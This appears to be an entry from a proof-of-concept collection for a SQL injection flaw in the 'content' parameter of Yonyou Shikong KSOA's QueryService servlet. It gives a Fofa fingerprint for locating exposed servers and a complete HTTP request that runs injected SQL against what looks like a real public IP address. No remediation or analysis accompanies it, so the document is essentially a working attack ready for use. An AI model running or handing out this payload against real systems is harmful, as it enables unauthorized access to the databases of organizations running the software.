# 用友时空 KSOA QueryService 处 content 参数 SQL 注入漏洞

    ## Fofa

```
body="onmouseout=\"this.classname='btn btnOff'\""
```

## poc

```
GET /servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','test')) HTTP/1.1
Host: 1.192.90.153:1111
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip

```
